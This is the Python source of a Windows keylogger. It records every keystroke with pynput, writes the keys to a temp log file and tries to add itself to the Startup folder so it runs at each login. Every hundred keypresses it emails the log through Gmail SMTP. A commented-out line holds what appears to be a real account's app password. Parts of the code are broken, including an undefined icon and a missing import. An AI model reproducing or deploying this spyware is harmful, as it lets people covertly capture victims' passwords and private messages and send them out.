from pynput.keyboard import Key, Listener
import os
import shutil
import datetime
import getpass
import winshell
# from win32con.client import Dispatch
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import threading
import socket

# temporary folder

save = tempfile.mkdtemp("screen")
print(save)
cwd = os.getcwd()
source = os.listdir()

dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")

filename = save + "key_log" + dateAndtime + ".txt"
open(filename, "w+")
keys = []
count = 0
countInternet = 0
word = "Key."

username = os.getlogin()

destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startuplogger'.format(username)

Sender_email = input("Enter your email ! : ")
Receiver_email = Sender_email
password_get =input("enter password")
# getpass.getpass(password_get)
# print(password)
# method for creating shortcut file in startup folder


def main():
    path = os.path.join(destination, "keylogger.pwy - shortcut.lnk")

    target =r"" + cwd + "keylogger.pyw"
    for files in source:
        if files == "keylogger.pyw":
            shell = Dispatch('WScript.shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()


shortcut = 'keylogger.pyw - Shortcut.lnk'

if shortcut in destination:
    pass
else:
    main()


# internet connection func
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False


# func to send email

def send_email():

    # "wangenyesimon@gmail.com"
    fromaddr = Sender_email
    toaddr = Receiver_email
    subject="hello fom keylloger.py"

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr
    msg['Subject'] =subject
    body = "Key INPUTS are:"
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    #     encode into base64
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " +filename)
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    # server.login(fromaddr, "jwzu ubru fnik ubck  "ztkz otck btim ywmu"")
    server.login(fromaddr,password_get)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()


def write_file(keys):
    with open(filename, "a")as f:
        for key in keys:

            if key == 'Key.enter':
                f.write("\n")
            elif key == 'Key.space':
                f.write(key.replace("Key.space", " "))
            elif key[:4] == word:
                pass
            else:
                f.write(key.replace("'", ""))


def on_press(key):
    global keys, count, countInternet, filename

    keys.append(str(key))

    if len(keys) > 10:
        write_file(keys)

    if is_connected():
        count += 1
        print('connected {}'.format(count))
        if count > 100:
            count = 0

            t1 = threading.Thread(target=send_email, name='t1')
            t1.start()

        else:
            countInternet += 1
            print("Not connected", countInternet)

            if countInternet > 10:
                countInternet = 0

                filename = filename.strip(save)
                for files in save:
                    if files == filename:
                        shutil.copy(files + "t", source)
        # Key.clear()


with Listener(on_press=on_press)as listener:
    listener.join()







